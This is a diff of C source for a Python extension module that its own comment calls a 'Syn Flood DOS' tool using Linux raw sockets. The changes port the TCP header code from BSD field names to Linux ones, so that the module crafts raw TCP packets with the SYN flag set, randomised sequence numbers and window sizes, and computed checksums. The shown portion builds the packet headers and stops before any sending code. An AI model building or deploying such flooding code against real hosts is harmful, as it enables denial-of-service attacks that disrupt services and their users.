@@ -2,13 +2,13 @@
     Syn Flood DOS with LINUX sockets, thanks binarytides.com!
 */
 #include <stdio.h>
-#define __USE_BSD 1 //Set linux ip headers to use BSD style headers
-#define __FAVOR_BSD 1 //Set linux tcp headers to use BSD style headers
+//#define __USE_BSD 0 //Set linux ip headers to use BSD style headers
+//#define __FAVOR_BSD 0 //Set linux tcp headers to use BSD style headers
 #include <netinet/tcp.h>   //Provides declarations for tcp header
 #include <netinet/ip.h>    //Provides declarations for ip header
 #include <Python.h>
  
-typedef struct pseudo_header    //needed for checksum calculation
+struct pseudo_header    //needed for checksum calculation
 {
     unsigned int source_address;
     unsigned int dest_address;
@@ -154,22 +154,21 @@ static PyObject * synmod_init(PyObject *self, PyObject* args)
     iph->ip_sum = csum((unsigned short *)datagram, iph->ip_len >> 1);
  
     //TCP Header
-    tcph->th_sport = htons(src_port);
-    tcph->th_dport = htons(dest_port);
-    tcph->th_seq = rand();
-    tcph->th_ack = 0;
-    tcph->th_off = 5;      /* first and only tcp segment */
-    /*tcph->fin=0;
+    tcph->source = htons(src_port);
+    tcph->dest = htons(dest_port);
+    tcph->seq = rand();
+    tcph->ack_seq = 0;
+    tcph->doff = 5;      /* first and only tcp segment */
+    tcph->fin=0;
     tcph->syn=1;
     tcph->rst=0;
     tcph->psh=0;
     tcph->ack=0;
-    tcph->urg=0;*/
-    tcph->th_flags = TH_SYN;
-    tcph->th_win = htons(rand()%5000); /* maximum allowed window size */
-    tcph->th_sum = 0;/* if you set a checksum to zero, your kernel's IP stack
+    tcph->urg=0;
+    tcph->window = htons(rand()%5000); /* maximum allowed window size */
+    tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
                 should fill in the correct checksum during transmission */
-    tcph->th_urp = 0;
+    tcph->urg_ptr = 0;
     //Now the IP checksum
 
     psh.source_address = inet_addr(src_addr);
@@ -180,7 +179,7 @@ static PyObject * synmod_init(PyObject *self, PyObject* args)
  
     memcpy(&psh.tcp , tcph , sizeof(struct tcphdr));
  
-    tcph->th_sum = csum((unsigned short*) &psh , sizeof(struct pseudo_header));
+    tcph->check = csum((unsigned short*) &psh , sizeof(struct pseudo_header));
 
     return PyInt_FromLong(42L);
 }
